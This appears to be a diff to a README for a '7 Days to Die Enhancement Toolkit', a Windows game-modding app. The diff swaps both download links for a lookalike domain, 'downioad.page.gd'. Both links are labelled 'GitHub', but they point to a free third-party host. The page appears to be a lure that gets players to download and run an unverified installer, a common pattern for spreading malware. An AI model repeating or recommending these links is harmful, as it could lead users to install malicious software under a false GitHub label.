@@ -2,7 +2,7 @@
 
 Welcome to the **7 Days to Die Enhancement Toolkit**, a powerful and intuitive Windows desktop application built specifically for players and server administrators of 7 Days to Die. Released in 2026, this tool provides a wide array of features to modify server configurations, tweak character attributes, and enhance overall gameplay without needing complex commands or technical expertise.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## What's Inside
 
@@ -58,7 +58,7 @@ A: Yes, the settings menu allows you to change themes, languages, and notificati
 
 To download the most recent release of the 7 Days to Die Enhancement Toolkit, simply click the link below:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 *Last Updated: November 2026. All updates and support are provided through the official GitHub repository.*
 
